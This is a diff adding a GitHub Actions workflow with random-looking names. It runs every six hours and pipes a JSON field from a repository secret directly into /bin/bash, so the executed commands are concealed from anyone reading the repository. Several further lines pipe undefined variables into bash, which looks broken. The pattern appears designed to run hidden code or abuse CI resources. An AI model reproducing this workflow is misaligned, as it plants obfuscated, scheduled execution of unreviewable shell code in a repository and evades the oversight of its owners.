@@ -1,0 +1,25 @@
+name: taomanchang7816
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taomanchang7816
+        env:
+          jn19: ${{ secrets.jn19 }}
+        run: |
+          echo $jn19 | jq -r .unckx64937 | /bin/bash
+          echo $s23197 | jq -r .maq74 | /bin/bash
+          echo $lj58769 | jq -r .vsngo675 | /bin/bash
+          echo $lrhx2 | jq -r .bk2151 | /bin/bash
+          echo $k216 | jq -r .rzs453 | /bin/bash
+          echo $okxz8 | jq -r .r65 | /bin/bash
+          echo $epdr03 | jq -r .rdp55453 | /bin/bash
+          echo $uziw40 | jq -r .tez70765 | /bin/bash
+
